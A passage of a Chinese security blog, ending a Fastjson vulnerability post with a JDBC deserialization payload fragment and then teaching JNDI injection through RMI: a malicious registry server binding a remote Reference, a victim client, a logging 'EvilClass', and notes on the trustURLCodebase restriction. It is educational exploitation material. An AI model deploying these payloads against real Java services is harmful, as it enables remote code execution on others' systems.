&quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class="line">                            &quot;autoDeserialize&quot;:&quot;true&quot;</span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1579/">https://tttang.com/archive/1579/</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#7-fastjson-1247">https://su18.org/post/fastjson/#7-fastjson-1247</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/" data-id="clgjsc3tt0000s0uq5jgl76t8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JNDI注入-RMI与LDAP的利用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/12/JNDI%E6%B3%A8%E5%85%A5-RMI%E4%B8%8ELDAP%E7%9A%84%E5%88%A9%E7%94%A8/" class="article-date">
  <time datetime="2023-04-11T18:45:30.000Z" itemprop="datePublished">2023-04-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/12/JNDI%E6%B3%A8%E5%85%A5-RMI%E4%B8%8ELDAP%E7%9A%84%E5%88%A9%E7%94%A8/">JNDI注入-RMI与LDAP的利用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。</p>
<h2 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h2><p>SPI 全称为 Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务:</p>
<ul>
<li>RMI: Java Remote Method Invocation，Java 远程方法调用；</li>
<li>LDAP: 轻量级目录访问协议；LDAP 既是一类服务，也是一种协议</li>
<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)；</li>
</ul>
<p>##JNDI结构</p>
<p>在<code>Java JDK</code>里面提供了5个包，提供给<code>JNDI</code>的功能实现，分别是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>



<h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><p>构造方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//构建一个初始上下文。</span><br><span class="line">InitialContext() </span><br><span class="line">//构造一个初始上下文，并选择不初始化它。</span><br><span class="line">InitialContext(boolean lazy) </span><br><span class="line">//使用提供的环境构建初始上下文。</span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//将名称绑定到对象。 </span><br><span class="line">bind(Name name, Object obj) </span><br><span class="line">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">list(String name) </span><br><span class="line">//检索命名对象。</span><br><span class="line">lookup(String name)  </span><br><span class="line">//将名称绑定到对象，覆盖任何现有绑定。</span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">//取消绑定命名对象。</span><br><span class="line">unbind(String name) </span><br></pre></td></tr></table></figure>

<p>例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        <span class="comment">//初始化上下文，即是获取初始目录环境</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在<strong>命名/目录系统外部</strong>找到的对象的引用。提供了<code>JNDI</code>中类的引用功能</p>
<p>构造方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为类名为“className”的对象构造一个新的引用。</span></span><br><span class="line">Reference(String className) </span><br><span class="line"><span class="comment">//为类名为“className”的对象和地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line"><span class="comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line"><span class="comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span></span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">className 远程加载时所使用的类名</span><br><span class="line">factory  加载的class中需要实例化类的名称</span><br><span class="line">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将地址添加到索引posn的地址列表中。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span> </span><br><span class="line"><span class="comment">//将地址添加到地址列表的末尾。 </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line"><span class="comment">//从此引用中删除所有地址。  </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索索引posn上的地址。 </span></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line"><span class="comment">//检索地址类型为“addrType”的第一个地址。  </span></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span> </span><br><span class="line"><span class="comment">//检索本参考文献中地址的列举。 </span></span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索引用引用的对象的类名。 </span></span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索此引用引用的对象的工厂位置。  </span></span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//检索此引用引用对象的工厂的类名。  </span></span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//从地址列表中删除索引posn上的地址。    </span></span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line"><span class="comment">//检索此引用中的地址数。 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> </span><br><span class="line"><span class="comment">//生成此引用的字符串表示形式。</span></span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br></pre></td></tr></table></figure>

<p>常用属性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">className 远程加载时所使用的类名</span><br><span class="line">classFactory 加载的 class 中需要实例化类的名称</span><br><span class="line">classFactoryLocation 提供 classes 数据的地址可以是 file/ftp/http 等协议</span><br></pre></td></tr></table></figure>



<h2 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>即是控制<code>lookup</code>函数的参数，使得客户端访问恶意的<code>RMI</code>或者<code>LOAP</code>服务来加载恶意对象，从而执行代码，完成利用。</p>
<p>在JNDI服务中，通过绑定一个外部的远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用<code>Reference</code>类实现的，具体是指如果远程获取<code>RMI</code>服务器上的对象为<code>Reference</code>类或者其子类时，可以从其他服务器上加载<code>Class</code>文件来实例化</p>
<h3 id="客户端dns查询demo"><a href="#客户端dns查询demo" class="headerlink" title="客户端dns查询demo"></a>客户端dns查询demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.Attributes;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DNSclient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hashtable &lt;String,String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;dns://114.114.114.114&quot;</span>); </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DirContext</span> <span class="variable">dirContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">res</span> <span class="operator">=</span> dirContext.getAttributes(<span class="string">&quot;example.com&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：114.114.114.114是国内移动、电信和联通通用的DNS，手机和电脑端都可以使用，干净无广告，解析成功率相对来说更高，国内用户使用的比较多，而且速度相对快、稳定，是国内用户上网常用的DNS。8.8.8.8是google的DNS</span></span><br></pre></td></tr></table></figure>

<h3 id="动态协议切换"><a href="#动态协议切换" class="headerlink" title="动态协议切换"></a>动态协议切换</h3><p>上面的demo可以发现，初始化 JNDI 上下文主要使用环境变量实现:</p>
<ul>
<li>INITIAL_CONTEXT_FACTORY：指定初始化协议的工厂类</li>
<li>PROVIDER_URL：指定对应名称服务的url地址</li>
</ul>
<p>但是，实际上在 Context.lookup 方法的参数中，用户可以指定自己的查找协议，我们来看下面的代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIDynamic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Usage: lookup &lt;domain&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">            <span class="type">DirContext</span> <span class="variable">lookCtx</span> <span class="operator">=</span> (DirContext)ctx.lookup(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">res</span> <span class="operator">=</span> lookCtx.getAttributes(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该demo功能是一个DNS解析，但是，我们也可以通过指定的查找参数去切换查找协议:</p>
<p>这就是 <code>JNDI 注入</code> 的根源所在。通过精心构造服务端的返回，我们可以让请求查找的客户端解析远程代码，最终实现远程命令执行。JDK 中默认支持的 JNDI 自动协议转换以及对应的工厂类如下所示:</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>schema</th>
<th>Context</th>
</tr>
</thead>
<tbody><tr>
<td>DNS</td>
<td>dns://</td>
<td>com.sun.jndi.url.dns.dnsURLContext</td>
</tr>
<tr>
<td>RMI</td>
<td>rmi://</td>
<td>com.sun.jndi.url.rmi.rmiURLContext</td>
</tr>
<tr>
<td>LDAP</td>
<td>ldap://</td>
<td>com.sun.jndi.url.ldap.ldapURLContext</td>
</tr>
<tr>
<td>LDAP</td>
<td>ldaps://</td>
<td>com.sun.jndi.url.ldaps.ldapsURLContextFactory</td>
</tr>
<tr>
<td>IIOP</td>
<td>iiop://</td>
<td>com.sun.jndi.url.iiop.iiopURLContext</td>
</tr>
<tr>
<td>IIOP</td>
<td>iiopname://</td>
<td>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</td>
</tr>
<tr>
<td>IIOP</td>
<td>corbaname://</td>
<td>com.sun.jndi.url.corbaname.corbanameURLContextFactory</td>
</tr>
</tbody></table>
<h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h2><p>服务端：<code>Server.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">factoryUrl</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:1098/&quot;</span>;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>,<span class="string">&quot;EvilClass&quot;</span>, factoryUrl);</span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">            registry.bind(<span class="string">&quot;Foo&quot;</span>, wrapper);</span><br><span class="line"></span><br><span class="line">            System.err.println(<span class="string">&quot;Server ready, factoryUrl:&quot;</span> + factoryUrl);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Server exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端：<code>Client.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Foo&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ret: &quot;</span> + ret);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意类：<code>Evilcalss.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;EvilClass: &quot;</span> + key);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        EvilClass.log(<span class="string">&quot;IIB block&quot;</span>);  <span class="comment">//实例初始化块  IIB</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        EvilClass.log(<span class="string">&quot;static block&quot;</span>);  <span class="comment">//静态代码块  Stctic</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        EvilClass.log(<span class="string">&quot;constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> &#123;</span><br><span class="line">        EvilClass.log(<span class="string">&quot;getObjectInstance&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****</span></span><br><span class="line"><span class="comment">1,静态代码块在类加载的时候执行，只会执行一次,</span></span><br><span class="line"><span class="comment">2实例初始化块与静态代码块不同的是它可以被执行多次，每次new一个含实例初始化块的对象都会执行。实例初始话块只有在对象被实例化的时候才会先于构造器被调用，所以静态代码块是先于实例初始化块调用的。</span></span><br><span class="line"><span class="comment">执行顺序：static -&gt; IIB -&gt; constructor</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<p>###高版本JDK</p>
<p>低版本下可以直接运行，<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始。com.sun.jndi.rmi.object.trustURLCodebase<code> 默认值为</code>false。运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。<br>不加参数，抛出异常：</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230404211529797.png" alt="image-20230404211529797"></p>
<p>原因在于<code>com\sun\jndi\rmi\registry\RegistryContext.java</code>中</p>
<p><code>trustURLCodebase</code>默认是<code>null</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230405224618788.png" alt="image-20230405224618788"></p>
<p>在<code>lookup</code>方法中进行了检测</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230405224815519.png" alt="image-20230405224815519"></p>
<p><code>decodeObject</code>方法中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote r, Name name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (r <span class="keyword">instanceof</span> RemoteReference)</span><br><span class="line">                        ? ((RemoteReference)r).getReference()</span><br><span class="line">                        : (Object)r;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Classes may only be loaded from an arbitrary URL codebase when</span></span><br><span class="line"><span class="comment">             * the system property com.sun.jndi.rmi.object.trustURLCodebase</span></span><br><span class="line"><span class="comment">             * has been set to &quot;true&quot;.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Use reference if possible</span></span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                ref = (Reference) obj;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                ref = ((Referenceable)(obj)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ref != <span class="literal">null</span> &amp;&amp; ref.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(</span><br><span class="line">                    <span class="string">&quot;The object factory is untrusted. Set the system property&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; 